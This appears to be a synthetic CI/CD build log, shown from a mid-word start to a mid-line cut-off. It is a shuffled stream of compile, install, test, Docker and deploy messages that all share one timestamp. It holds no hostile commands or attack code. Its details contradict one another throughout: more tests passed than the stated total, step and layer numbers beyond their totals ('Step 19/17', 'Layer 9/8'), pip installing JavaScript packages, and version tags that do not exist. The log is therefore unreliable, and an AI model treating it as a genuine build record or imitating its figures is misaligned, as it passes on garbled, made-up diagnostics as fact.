lodash\nCompiling utils/handler.rs...\nVerifying...\n[12:47:48] DEBUG: Initializing service\nArtifact uploaded: dist.zip (92MB)\nReady.\nRan 55 tests in 29s\nProcessing...\nDone.\nStep 2/25: Building\n  PASS: integration/test_api_health.spec.js\nWARNING: react has known vulnerabilities\n  PASS: test_cache_hit (72ms)\n[12:47:48] INFO: Request completed\nRan 104 tests in 44s\n[12:47:48] INFO: Cache refreshed\n[12:47:48] INFO: Request completed\n[12:47:48] INFO: Processing request\n[12:47:48] INFO: Processing request\n[12:47:48] INFO: Cache refreshed\nPulling image: python:latest\n\u2717 build failed with exit code 54\n[12:47:48] INFO: Request completed\nnpm notice: created a lockfile\n\u2713 build completed\n[12:47:48] DEBUG: Initializing service\nPlatform: darwin-arm64\nCompiling utils/utils.go...\nConnection established\n[12:47:48] INFO: Request completed\nCompiling utils/index.js...\nException: RuntimeError\n[12:47:48] INFO: Connecting to database\nTest Suites: 45 passed, 39 total\nStep 6/18: Deploying\nAlready up to date.\nnpm notice: created a lockfile\nWARNING: prettier has known vulnerabilities\n[12:47:48] DEBUG: Initializing service\nPushing to registry...\nTest Suites: 50 passed, 6 total\nCompleted.\nArtifact downloaded: 37MB\nNODE_ENV=test\nStep 4/20: Building\nPlatform: linux-x64\nPulling image: python:latest\nSwitched to branch 'feature/task-362'\nStep 17/20: Running migrations\n[12:47:48] DEBUG: Query executed in 21ms\nCompleted.\nBuilding Docker image...\nStep 14/17: Running migrations\n[12:47:48] DEBUG: Query executed in 57ms\n\u2717 build failed with exit code 99\npip: Collecting prettier\nOK\nMinifying app.js\n=== Step deploy_staging completed ===\n=== Step: build ===\nTime: 97.39s\n[12:47:48] INFO: Request completed\nMinifying vendor.js\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (43MB)\nCache restored successfully (499MB)\n\u2713 validate completed\n[12:47:48] INFO: Cache refreshed\nCompleted.\n  PASS: unit/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\nChecking out develop branch\nCompiling lib/main.py...\nInstalling express@5.18.3\nTime: 40.102s\nVerifying...\nUploading artifact 'dist' (45 files)\nFinished.\n\u2713 Step 'install' succeeded\nnpm install: resolved 1647 packages\nStep 4/19: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:48] INFO: Request completed\nFinished.\nCreating production build...\nReady.\n[12:47:48] INFO: Processing request\nOK\npip install: Successfully installed prettier-2.0\nReady.\nHEAD is now at c4b4952\n[12:47:48] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (10MB)\nLayer 4/9: RUN command\nDone.\nDone.\nCompiling components/main.py...\nTime: 35.772s\nNODE_ENV=test\npip install: Successfully installed webpack-2.20\nRan 149 tests in 39s\nStep 15/24: Linting\nCache invalidated: dependencies\nCompiling components/app.ts...\nRan 50 tests in 37s\nStep 12/22: Running migrations\nTests: 419 passed, 320 total\nCache invalidated: build\nStep 6/21: Building\nCache restored successfully (129MB)\nSuccess!\nCoverage: 90% statements, 76% branches\nWARNING: eslint has known vulnerabilities\nMinifying vendor.js\n[12:47:48] INFO: Cache refreshed\nVerifying...\nWARNING: webpack has known vulnerabilities\nCompiling src/utils.go...\nUploading artifact 'dist' (46 files)\nTransforming 842 files...\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTLS handshake completed\nTransforming 145 files...\npip install: Successfully installed react-5.2\nSwitched to branch 'feature/task-707'\nPlatform: linux-x64\nSnapshots: 0 passed, 3 total\nCompiling utils/service.java...\nReady.\n[12:47:48] DEBUG: Memory usage: 1308MB\nLayer 9/8: ENV command\nFinished.\nCompiling utils/index.js...\nFetching submodules...\n[12:47:48] DEBUG: Loading configuration\nLoading...\n[12:47:48] INFO: Processing request\npip: Downloading express-5.17.tar.gz\nLayer 9/12: RUN command\nOK\nnpm notice: created a lockfile\npip install: Successfully installed axios-5.1\nTransforming 388 files...\nLayer 5/12: RUN command\npip: Downloading jest-4.18.tar.gz\nCreating production build...\nEnvironment: test\nTransforming 647 files...\nStep 14/20: Running migrations\nLoading...\nUsing Python 3.10\nUploading artifact 'dist' (23 files)\nStep 14/18: Deploying\nCompiling components/service.java...\nPOST /data - 200 (492ms)\n[12:47:48] WARN: Deprecated API usage\nDone.\nUsing Python 3.10\n\u2713 All checks passed\nWARNING: express has known vulnerabilities\nAlready up to date.\n\u2713 Task completed in 3648ms\nLayer 8/12: RUN command\nAlready up to date.\nDone.\n  PASS: unit/test_api_health.spec.js\nnpm notice: created a lockfile\nRan 127 tests in 1s\n[12:47:48] DEBUG: Query executed in 1ms\nTransforming 109 files...\nArtifact uploaded: dist.zip (56MB)\nTest Suites: 21 passed, 23 total\n[12:47:48] INFO: Cache refreshed\nFAILED: test_api_health\nCache restored successfully (499MB)\nRan 108 tests in 56s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling utils/handler.rs...\n[12:47:48] DEBUG: Initializing service\nWARNING: webpack has known vulnerabilities\n[12:47:48] INFO: Request completed\n\u2713 Step 'install' succeeded\nSwitched to branch 'feature/task-783'\nCache miss for key-4911\nTest Suites: 49 passed, 36 total\nTLS handshake completed\nUploading artifact 'build' (37 files)\nGenerating source maps...\nCache invalidated: build\nFetching from https://googleapis.com/package.json\nUsing Node.js 17.13.8\nLayer 2/12: RUN command\nGenerating source maps...\nReady.\nTransforming 619 files...\nCreating production build...\nFAILED: test_auth_login\nFinished.\nStep 11/16: Running migrations\nUsing Node.js 15.7.1\nOptimizing 75 modules...\nNODE_ENV=production\nStep 4/19: Installing dependencies\nGET /health - 204 (44ms)\nCompiling src/index.js...\nnpm notice: created a lockfile\nSnapshots: 12 passed, 10 total\n\u2713 All checks passed\n\u2713 validate completed\nPlatform: darwin-arm64\nUploading artifact 'coverage' (25 files)\nConnection established\nWaiting...\nCache miss for key-1083\n[12:47:48] DEBUG: Query executed in 89ms\nReady.\nUploading artifact 'coverage' (48 files)\nStep 13/17: Testing\nAlready up to date.\n\u2717 build failed with exit code 34\nGenerating source maps...\nPulling image: node:3.11\n[12:47:48] DEBUG: Memory usage: 143MB\nEnvironment: development\nBuilding Docker image...\nCompiling src/main.py...\nCache hit for key-4901\nUsing Node.js 18.9.0\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (18MB)\nSnapshots: 14 passed, 36 total\nOptimizing 88 modules...\npip: Collecting jest\npip install: Successfully installed prettier-4.18\nUploading artifact 'dist' (8 files)\nCoverage: 89% statements, 87% branches\nStep 15/16: Installing dependencies\n[12:47:48] INFO: Starting build process\nLoading...\n[12:47:48] INFO: Starting build process\n[12:47:48] INFO: Request completed\nStep 5/17: Linting\n[12:47:48] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 9/20: Testing\nUsing Python 3.10\nOK\npip: Installing build dependencies...\nVerifying...\nChecking out master branch\nLayer 8/11: RUN command\nArtifact downloaded: 18MB\npip: Downloading axios-5.13.tar.gz\nCache invalidated: build\npip: Installing build dependencies...\nTLS handshake completed\nUploading artifact 'build' (46 files)\nCoverage: 90% statements, 65% branches\nArtifact uploaded: build.tar.gz (30MB)\nWaiting...\n[12:47:48] INFO: Processing request\nConnection established\nSnapshots: 4 passed, 5 total\n\u2717 build failed with exit code 108\nDone.\nReady.\nException: TypeError\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nLayer 1/10: RUN command\nnpm notice: created a lockfile\nPushing to registry...\nCompiling lib/utils.go...\nCreating production build...\nGET /health - 200 (36ms)\nException: NullPointerException\n[12:47:48] INFO: Cache refreshed\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] DEBUG: Memory usage: 1105MB\nInstalling webpack@4.3.7\nCache miss for key-4142\npip: Downloading jest-2.4.tar.gz\nnpm notice: created a lockfile\nSuccess!\n[12:47:48] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (41MB)\n[12:47:48] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nCompiling utils/utils.go...\nWARNING: axios has known vulnerabilities\nStep 12/23: Deploying\nUsing Python 3.9\nSuccess!\n[12:47:48] INFO: Cache refreshed\nCache hit for key-8543\nTime: 79.306s\nCreating production build...\nStep 9/18: Building\nPOST /upload - 202 (462ms)\nSuccess!\nFetching submodules...\nException: ValueError\nSnapshots: 33 passed, 27 total\npip: Collecting eslint\nSwitched to branch 'feature/task-278'\nImage pulled successfully\nOptimizing 37 modules...\nnpm install: resolved 1303 packages\n\u2713 All checks passed\nMinifying app.js\nSnapshots: 48 passed, 49 total\nRan 108 tests in 33s\nStep 20/25: Testing\nArtifact uploaded: build.tar.gz (13MB)\nFetching from https://gcr.io/package.json\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nGET /status - 200 (36ms)\nVerifying...\nWARNING: eslint has known vulnerabilities\n[12:47:48] INFO: Processing request\nGenerating source maps...\nProcessing...\n[12:47:48] WARN: Deprecated API usage\nHEAD is now at 8bda8a9\n[12:47:48] DEBUG: Query executed in 75ms\nRan 175 tests in 46s\nStep 15/25: Deploying\n[12:47:48] DEBUG: Loading configuration\n=== Step build completed ===\n=== Step: upload_artifacts ===\nGenerating source maps...\nRan 158 tests in 31s\nCoverage: 89% statements, 76% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: eslint has known vulnerabilities\n[12:47:48] DEBUG: Query executed in 30ms\nOptimizing 79 modules...\nAlready up to date.\nPushing to registry...\nStep 1/15: Running migrations\nUsing Python 3.11\nStep 7/15: Building\nStep 13/20: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 75 modules...\nLoading...\nSwitched to branch 'hotfix/task-491'\nCache miss for key-9182\nTest Suites: 43 passed, 15 total\npip install: Successfully installed webpack-1.20\n[12:47:48] DEBUG: Memory usage: 706MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:48] ERROR: Connection failed\nBundling styles.js\n[12:47:48] WARN: Deprecated API usage\nFetching from https://github.com/package.json\n\u2713 Task completed in 132ms\nCache saved successfully\nUploading artifact 'coverage' (27 files)\nNODE_ENV=test\nOK\n[12:47:48] DEBUG: Connection pool: 9 active\nProcessing...\nStep 10/22: Linting\nStep 15/24: Installing dependencies\nWaiting...\n[12:47:48] DEBUG: Query executed in 37ms\nCompiling lib/service.java...\n  PASS: e2e/test_auth_login.spec.js\nnpm install: resolved 606 packages\nWARNING: react has known vulnerabilities\nFAILED: test_api_health\nTLS handshake completed\nStep 19/17: Testing\n  PASS: test_auth_login (397ms)\nReady.\n[12:47:48] WARN: Deprecated API usage\nReady.\nHEAD is now at 7a4fb16\nStep 16/22: Building\nCompiling utils/app.ts...\n[12:47:48] DEBUG: Connection pool: 10 active\n[12:47:48] DEBUG: Memory usage: 1568MB\n\u2713 Task completed in 3179ms\nBuilding Docker image...\nImage pulled successfully\n\u2713 Task completed in 4678ms\nPulling image: alpine:18\nnpm notice: package.json updated\n[12:47:48] WARN: Deprecated API usage\nTLS handshake completed\nTLS handshake completed\nTest Suites: 24 passed, 17 total\nFetching from https://githubusercontent.com/package.json\nSwitched to branch 'hotfix/task-583'\nFetching from https://npmjs.org/package.json\nyarn add: Done in 9.89s\nSuccess!\nyarn add: Done in 25.66s\nnpm install: resolved 560 packages\nTLS handshake completed\nImage pulled successfully\nCache miss for key-3902\n\u2713 Task completed in 4285ms\nOK\nConnection established\nPushing to registry...\nUsing Python 3.12\nStep 19/23: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\nyarn add: Done in 27.87s\nMinifying app.js\nTests: 215 passed, 354 total\nTransforming 815 files...\nTransforming 830 files...\nStep 18/16: Installing dependencies\nProcessing...\nCompiling lib/service.java...\nVerifying...\nReady.\nStep 15/15: Building\nBundling main.js\nCache invalidated: node_modules\nCompiling components/utils.go...\n[12:47:48] INFO: Request completed\nTLS handshake completed\nUploading artifact 'build' (45 files)\nException: TypeError\nWARNING: eslint has known vulnerabilities\nStep 16/24: Installing dependencies\nCompiling lib/main.py...\nNODE_ENV=development\nCache hit for key-1947\n[12:47:48] INFO: Connecting to database\nDone.\n[12:47:48] WARN: Deprecated API usage\nPlatform: win32-x64\n\u2713 package completed\nStep 9/19: Building\nTLS handshake completed\nPulling image: alpine:3.11\nLoading...\nUsing Python 3.10\nPOST /upload - 201 (115ms)\nArtifact uploaded: build.tar.gz (26MB)\nFAILED: test_user_create\nBuilding Docker image...\nStep 20/23: Deploying\n[12:47:48] INFO: Processing request\npip: Installing build dependencies...\nyarn add: Done in 6.60s\nFinished.\nStep 4/20: Installing dependencies\nAlready up to date.\npip: Installing build dependencies...\npip: Installing build dependencies...\nConnection established\nStep 18/24: Linting\nPulling image: node:latest\nCompiling utils/handler.rs...\nArtifact uploaded: dist.zip (40MB)\nLayer 7/8: RUN command\n[12:47:48] INFO: Processing request\n[12:47:48] INFO: Connecting to database\nRan 143 tests in 50s\n  PASS: unit/test_api_health.spec.js\nSnapshots: 41 passed, 4 total\nFAILED: test_user_create\nCompleted.\nCache restored successfully (49MB)\nFAILED: test_cache_hit\nLoading...\nSnapshots: 29 passed, 13 total\n[12:47:48] DEBUG: Query executed in 68ms\nWARNING: webpack has known vulnerabilities\nLoading...\nOptimizing 65 modules...\nStep 15/21: Running migrations\nArtifact downloaded: 34MB\n[12:47:48] WARN: Deprecated API usage\npip: Installing build dependencies...\n  PASS: test_cache_hit (46ms)\nOptimizing 57 modules...\nCreating production build...\n[12:47:48] DEBUG: Loading configuration\nRan 172 tests in 56s\nLoading...\nNODE_ENV=production\nChecking out master branch\n\u2717 build failed with exit code 96\nyarn add: Done in 13.63s\nCompiling src/app.ts...\nCompiling src/index.js...\nPulling image: python:18\n\u2713 validate completed\n[12:47:48] DEBUG: Connection pool: 13 active\n[12:47:48] INFO: Cache refreshed\nCache restored successfully (366MB)\nFetching submodules...\nnpm notice: package.json updated\nCoverage: 85% statements, 97% branches\nWaiting...\nStep 4/20: Linting\nFinished.\nStep 5/25: Building\nConnection established\nUsing Python 3.10\n[12:47:48] INFO: Request completed\n[12:47:48] DEBUG: Initializing service\nProcessing...\nStep 16/16: Installing dependencies\nSwitched to branch 'hotfix/task-737'\nOptimizing 52 modules...\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\n[12:47:48] DEBUG: Memory usage: 887MB\n[12:47:48] INFO: Starting build process\npip: Downloading eslint-1.8.tar.gz\n\u2713 Step 'setup' succeeded\nAlready up to date.\n  PASS: e2e/test_api_health.spec.js\nDone.\nnpm notice: package.json updated\n[12:47:48] DEBUG: Connection pool: 9 active\n[12:47:48] DEBUG: Loading configuration\nTLS handshake completed\nPOST /api - 200 (306ms)\nCache restored successfully (242MB)\nCompiling src/service.java...\nNODE_ENV=test\nOptimizing 53 modules...\nFinished.\nArtifact uploaded: dist.zip (16MB)\nCache miss for key-5857\nHEAD is now at 8f4fbf3\npip install: Successfully installed axios-1.2\nConnection established\nArtifact uploaded: dist.zip (89MB)\nEnvironment: development\nArtifact uploaded: build.tar.gz (12MB)\nCoverage: 85% statements, 95% branches\nVerifying...\nTests: 139 passed, 330 total\nOK\nCoverage: 97% statements, 83% branches\nPulling image: python:latest\nChecking out develop branch\n[12:47:48] DEBUG: Memory usage: 1758MB\nChecking out master branch\nProcessing...\nTransforming 218 files...\nGenerating source maps...\nEnvironment: staging\nDone.\nDone.\nVerifying...\nOK\nOK\nAlready up to date.\n  PASS: unit/test_auth_login.spec.js\nStep 5/15: Testing\nRan 121 tests in 37s\nDone.\n[12:47:48] DEBUG: Loading configuration\nGenerating source maps...\nCache restored successfully (208MB)\n[12:47:48] INFO: Request completed\nnpm notice: package.json updated\nnpm install: resolved 1770 packages\nPulling image: python:18\n[12:47:48] INFO: Processing request\nStep 13/24: Building\nCompiling utils/service.java...\nGET /api - 201 (4ms)\nStep 13/23: Linting\nnpm notice: package.json updated\nCreating production build...\nCompiling lib/service.java...\nCreating production build...\nWARNING: lodash has known vulnerabilities\nPOST /data - 200 (276ms)\nnpm notice: created a lockfile\nCache miss for key-9728\nReady.\n  PASS: integration/test_cache_hit.spec.js\nStep 20/15: Building\nProcessing...\nArtifact downloaded: 9MB\nnpm install: added 118 packages\nEnvironment: production\nCache hit for key-7928\n[12:47:48] DEBUG: Connection pool: 19 active\nTest Suites: 27 passed, 35 total\nPOST /data - 200 (331ms)\nStep 15/19: Deploying\nMinifying main.js\nMinifying app.js\nStep 9/16: Building\nStep 6/25: Testing\nOK\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nFetching from https://registry.npmjs.org/package.json\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] INFO: Starting build process\nArtifact uploaded: dist.zip (27MB)\nStep 2/23: Running migrations\n  PASS: test_api_health (282ms)\nLoading...\n[12:47:48] INFO: Request completed\nOK\nFetching submodules...\nEnvironment: development\nCompiling utils/service.java...\nDone.\nStep 18/21: Deploying\nReady.\nOK\nSwitched to branch 'bugfix/task-528'\nNODE_ENV=production\n  PASS: test_user_create (58ms)\nCache miss for key-4741\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nLayer 5/13: ENV command\nStep 13/22: Testing\nUploading artifact 'dist' (16 files)\nAlready up to date.\n[12:47:48] INFO: Cache refreshed\npip: Collecting lodash\nSuccess!\nHEAD is now at 1531645\n[12:47:48] INFO: Cache refreshed\n[12:47:48] WARN: Deprecated API usage\nAlready up to date.\nnpm notice: package.json updated\nCompiling utils/service.java...\nTransforming 477 files...\nWARNING: react has known vulnerabilities\n[12:47:48] DEBUG: Query executed in 66ms\nUploading artifact 'build' (37 files)\n[12:47:48] DEBUG: Loading configuration\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nVerifying...\n[12:47:48] INFO: Connecting to database\nProcessing...\nChecking out develop branch\n[12:47:48] INFO: Connecting to database\n[12:47:48] DEBUG: Memory usage: 822MB\n[12:47:48] DEBUG: Query executed in 63ms\nCompiling components/index.js...\nTransforming 493 files...\nCompiling lib/utils.go...\nCompiling utils/index.js...\n[12:47:48] DEBUG: Loading configuration\nTLS handshake completed\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: dist.zip (95MB)\n[12:47:48] WARN: Deprecated API usage\nCache hit for key-5499\nCache invalidated: build\nStep 16/23: Linting\n\u2713 Task completed in 1473ms\n\u2713 All checks passed\nRan 163 tests in 17s\nHEAD is now at 85c8390\nReady.\nStep 14/25: Testing\nBundling vendor.js\nLoading...\nCache saved successfully\nCache saved successfully\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFinished.\nTransforming 411 files...\nCoverage: 72% statements, 86% branches\n[12:47:48] WARN: Deprecated API usage\n\u2713 Task completed in 1799ms\n\u2713 All checks passed\nCreating production build...\nAlready up to date.\nCache restored successfully (29MB)\nOptimizing 86 modules...\nPushing to registry...\nProcessing...\nGET /health - 204 (70ms)\nBundling vendor.js\n[12:47:48] DEBUG: Initializing service\npip: Installing build dependencies...\nCompiling utils/handler.rs...\nGenerating source maps...\n[12:47:48] ERROR: Connection failed\nnpm notice: package.json updated\n[12:47:48] DEBUG: Query executed in 18ms\nWARNING: jest has known vulnerabilities\nMinifying vendor.js\nTest Suites: 29 passed, 30 total\nSwitched to branch 'hotfix/task-206'\nStep 19/21: Linting\n\u2713 All checks passed\n[12:47:48] INFO: Connecting to database\nUsing Node.js 17.0.3\n[12:47:48] INFO: Request completed\n\u2713 Task completed in 4666ms\nLayer 9/14: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nArtifact uploaded: dist.zip (83MB)\nStep 7/17: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 21 tests in 32s\npip: Downloading lodash-4.15.tar.gz\nFinished.\nUploading artifact 'coverage' (20 files)\nWARNING: eslint has known vulnerabilities\nStep 11/18: Running migrations\n\u2713 package completed\nCache restored successfully (24MB)\nPushing to registry...\n\u2713 Step 'install' succeeded\n[12:47:48] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 96% statements, 71% branches\nNODE_ENV=production\nCache miss for key-5240\nStep 1/25: Testing\nArtifact downloaded: 16MB\nGenerating source maps...\nNODE_ENV=production\nConnection established\nTest Suites: 20 passed, 9 total\nStep 4/15: Testing\nLayer 8/8: RUN command\nCompleted.\nPlatform: darwin-arm64\n  PASS: test_user_create (39ms)\nWaiting...\npip: Installing build dependencies...\nFAILED: test_auth_login\nNODE_ENV=development\n\u2713 Step 'test' succeeded\nStep 3/17: Building\n\u2713 validate completed\nConnection established\nChecking out develop branch\nCoverage: 85% statements, 97% branches\nTLS handshake completed\nnpm install: added 240 packages\nUploading artifact 'coverage' (12 files)\nOK\nCompiling components/utils.go...\nnpm notice: created a lockfile\nStep 10/22: Testing\nTLS handshake completed\n[12:47:48] INFO: Processing request\npip: Installing build dependencies...\nCompiling components/app.ts...\nTransforming 259 files...\nOptimizing 50 modules...\nTest Suites: 37 passed, 46 total\nUploading artifact 'build' (24 files)\n[12:47:48] INFO: Processing request\nArtifact uploaded: dist.zip (19MB)\n\u2713 Task completed in 3405ms\nCompiling components/handler.rs...\nStep 19/16: Running migrations\nImage pulled successfully\n[12:47:48] INFO: Starting build process\n  PASS: test_user_create (7ms)\nnpm notice: created a lockfile\nStep 1/21: Building\nFetching submodules...\nStep 1/19: Running migrations\nTime: 87.238s\nnpm notice: created a lockfile\nVerifying...\nReady.\nCompiling utils/service.java...\nSwitched to branch 'bugfix/task-939'\nnpm notice: package.json updated\n[12:47:48] DEBUG: Connection pool: 6 active\nWaiting...\n[12:47:48] DEBUG: Query executed in 44ms\nPulling image: node:3.11\nCompiling src/service.java...\n[12:47:48] DEBUG: Initializing service\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/service.java...\nAlready up to date.\nStep 19/24: Testing\nCompiling lib/utils.go...\nnpm notice: package.json updated\nBundling runtime.js\n[12:47:48] DEBUG: Query executed in 23ms\n[12:47:48] DEBUG: Loading configuration\nDone.\nWARNING: jest has known vulnerabilities\nMinifying vendor.js\n  PASS: test_cache_hit (462ms)\nWARNING: react has known vulnerabilities\n\u2713 package completed\nCreating production build...\n[12:47:48] DEBUG: Connection pool: 3 active\nCompiling components/index.js...\nCreating production build...\nUsing Node.js 18.9.4\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nEnvironment: production\n[12:47:48] DEBUG: Initializing service\nStep 14/23: Running migrations\nFAILED: test_db_connect\nUsing Python 3.10\nEnvironment: production\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: test\nFetching submodules...\n  PASS: test_api_health (404ms)\nLayer 9/8: COPY command\n[12:47:48] DEBUG: Initializing service\nVerifying...\nReady.\nChecking out develop branch\nMinifying vendor.js\n[12:47:48] INFO: Cache refreshed\n  PASS: integration/test_api_health.spec.js\nTests: 70 passed, 138 total\nNODE_ENV=development\nTime: 38.417s\nArtifact uploaded: build.tar.gz (30MB)\nWARNING: react has known vulnerabilities\nCompiling lib/handler.rs...\nException: NullPointerException\n[12:47:48] DEBUG: Query executed in 7ms\nWARNING: webpack has known vulnerabilities\nCompiling lib/service.java...\npip install: Successfully installed jest-5.19\nCreating production build...\nTests: 145 passed, 131 total\nUsing Python 3.11\nStep 14/17: Installing dependencies\nArtifact downloaded: 42MB\nGET /health - 201 (77ms)\nPOST /api - 200 (41ms)\nStep 13/25: Building\nTest Suites: 38 passed, 8 total\nFetching from https://githubusercontent.com/package.json\nWARNING: webpack has known vulnerabilities\nChecking out master branch\n[12:47:48] WARN: Deprecated API usage\nImage pulled successfully\nWaiting...\n[12:47:48] DEBUG: Memory usage: 391MB\nCompiling utils/index.js...\nHEAD is now at 256859d\nBundling vendor.css\nCompiling src/utils.go...\nStep 19/23: Linting\nOK\nLayer 5/13: COPY command\n[12:47:48] DEBUG: Connection pool: 18 active\nCache miss for key-4554\nFAILED: test_cache_hit\npip install: Successfully installed jest-2.10\nPOST /api - 202 (406ms)\nImage pulled successfully\nTest Suites: 11 passed, 31 total\nNODE_ENV=production\npip: Collecting jest\nArtifact downloaded: 33MB\n=== Step setup_node completed ===\n=== Step: save_cache ===\nSnapshots: 6 passed, 21 total\nStep 15/18: Building\n[12:47:48] INFO: Connecting to database\nTLS handshake completed\nBundling main.css\nFetching from https://registry.npmjs.org/package.json\n\u2713 deploy completed\nWARNING: lodash has known vulnerabilities\nUploading artifact 'build' (23 files)\nDone.\nCache saved successfully\nBuilding Docker image...\nInstalling jest@5.20.9\nTransforming 892 files...\nLayer 1/14: COPY command\n[12:47:48] WARN: Deprecated API usage\nCreating production build...\nProcessing...\nCache invalidated: build\nPulling image: alpine:3.11\n[12:47:48] INFO: Connecting to database\nCompiling src/main.py...\nSwitched to branch 'hotfix/task-999'\nSnapshots: 2 passed, 5 total\n\u2713 All checks passed\nFetching submodules...\nImage pulled successfully\nUsing Python 3.12\nPushing to registry...\n[12:47:48] ERROR: Connection failed\nDone.\n[12:47:48] DEBUG: Query executed in 82ms\nTime: 40.192s\npip: Downloading prettier-2.14.tar.gz\nSnapshots: 4 passed, 48 total\n  PASS: test_db_connect (432ms)\n[12:47:48] INFO: Request completed\nDone.\nInstalling axios@5.1.0\nArtifact uploaded: build.tar.gz (25MB)\nTLS handshake completed\nGenerating source maps...\nCompiling components/service.java...\nRan 66 tests in 52s\nHEAD is now at 40e0520\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nImage pulled successfully\nHEAD is now at fd08a52\nWARNING: prettier has known vulnerabilities\nUploading artifact 'coverage' (13 files)\nTests: 127 passed, 164 total\nnpm notice: package.json updated\nnpm notice: created a lockfile\nRan 63 tests in 34s\nPulling image: node:3.11\nCompiling src/main.py...\nChecking out master branch\nWaiting...\n[12:47:48] DEBUG: Connection pool: 20 active\nStep 7/19: Linting\nnpm install: added 166 packages\n\u2713 Task completed in 2124ms\nnpm notice: created a lockfile\nWaiting...\nStep 1/25: Linting\nSwitched to branch 'feature/task-523'\n[12:47:48] INFO: Cache refreshed\nTime: 96.419s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:48] ERROR: Connection failed\nDone.\nPulling image: alpine:18\nOptimizing 47 modules...\nStep 19/15: Deploying\nyarn add: Done in 29.60s\nChecking out main branch\nStep 16/21: Building\nBuilding Docker image...\nNODE_ENV=test\nArtifact uploaded: build.tar.gz (44MB)\nNODE_ENV=production\nUsing Python 3.9\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nCompiling lib/app.ts...\n  PASS: e2e/test_cache_hit.spec.js\nCompiling src/app.ts...\nGET /api - 200 (21ms)\nProcessing...\nImage pulled successfully\nStep 17/17: Deploying\nException: ValueError\nUploading artifact 'dist' (35 files)\nMinifying vendor.js\nCache miss for key-1305\nArtifact uploaded: dist.zip (33MB)\nSuccess!\n[12:47:48] WARN: Deprecated API usage\nDone.\nArtifact downloaded: 50MB\nImage pulled successfully\nGET /status - 204 (93ms)\nTLS handshake completed\nWARNING: eslint has known vulnerabilities\nFinished.\n[12:47:48] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Collecting eslint\nCache miss for key-9084\n[12:47:48] DEBUG: Connection pool: 3 active\nBuilding Docker image...\nCache saved successfully\nConnection established\nTransforming 737 files...\nTests: 355 passed, 438 total\nOptimizing 81 modules...\n[12:47:48] DEBUG: Connection pool: 5 active\nImage pulled successfully\nCompiling src/handler.rs...\nPulling image: alpine:18\nUploading artifact 'dist' (24 files)\nAlready up to date.\nArtifact uploaded: dist.zip (40MB)\nStep 18/16: Installing dependencies\nStep 2/25: Installing dependencies\n[12:47:48] INFO: Request completed\nEnvironment: production\nFetching submodules...\n  PASS: test_cache_hit (253ms)\nStep 5/20: Deploying\n  PASS: test_db_connect (126ms)\nProcessing...\nLoading...\nnpm notice: package.json updated\nTransforming 821 files...\nFinished.\nAlready up to date.\nUploading artifact 'coverage' (35 files)\nStep 12/22: Linting\nTLS handshake completed\nArtifact downloaded: 12MB\nStep 14/25: Linting\nCompiling src/service.java...\nStep 5/18: Deploying\nConnection established\nWARNING: prettier has known vulnerabilities\n  PASS: e2e/test_cache_hit.spec.js\nNODE_ENV=development\nnpm install: resolved 721 packages\nPOST /data - 201 (253ms)\nMinifying app.js\nPushing to registry...\n  PASS: test_api_health (155ms)\nPulling image: node:18\nnpm notice: created a lockfile\nnpm install: added 129 packages\nnpm install: resolved 372 packages\npip: Downloading eslint-1.8.tar.gz\nPushing to registry...\nNODE_ENV=development\nyarn add: Done in 20.54s\nnpm notice: created a lockfile\nStep 13/25: Linting\nSnapshots: 44 passed, 46 total\nnpm install: added 221 packages\n\u2713 deploy completed\nnpm install: added 468 packages\nFetching from https://githubusercontent.com/package.json\n[12:47:48] DEBUG: Connection pool: 15 active\n\u2713 Task completed in 3507ms\n[12:47:48] WARN: Deprecated API usage\nPOST /data - 201 (391ms)\nBuilding Docker image...\n[12:47:48] DEBUG: Query executed in 21ms\n[12:47:48] DEBUG: Query executed in 31ms\n  PASS: unit/test_api_health.spec.js\nCoverage: 82% statements, 83% branches\npip: Collecting lodash\npip install: Successfully installed express-5.9\nCoverage: 73% statements, 78% branches\nLayer 8/15: RUN command\nBundling styles.js\nCache invalidated: node_modules\n[12:47:48] INFO: Processing request\nTime: 7.565s\nSnapshots: 17 passed, 0 total\nBundling runtime.css\n\u2713 Task completed in 1115ms\nSuccess!\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] DEBUG: Initializing service\nUploading artifact 'build' (20 files)\nProcessing...\n[12:47:48] INFO: Request completed\nFetching 